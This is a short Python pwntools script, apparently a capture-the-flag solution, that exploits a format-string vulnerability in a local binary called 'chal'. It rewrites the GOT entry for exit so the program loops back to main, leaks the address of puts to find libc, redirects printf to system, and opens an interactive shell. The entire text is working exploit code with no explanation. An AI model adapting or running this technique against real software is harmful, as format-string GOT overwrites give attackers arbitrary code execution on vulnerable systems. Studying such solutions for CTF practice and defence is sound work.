from pwn import *

e = ELF("./chal")
p = process("./chal")
context.binary = e


def send_payload(payload):
        p.sendlineafter(b"What have we got? \n",payload)

# First loop to get more writes
send_payload(fmtstr_payload(6,{e.got.exit: e.sym.main}))

send_payload(b"aaaa%7$s"+p64(e.got.puts))
p.recvuntil("aaaa")
leak = u64(p.recvline()[:6]+b"\0\0")
print(hex(leak))

libc = p.libc

libc.address = 0
libc.address = leak - libc.sym.puts

send_payload(fmtstr_payload(6,{e.got.printf: libc.sym.system}))

p.sendline("sh")

p.interactive()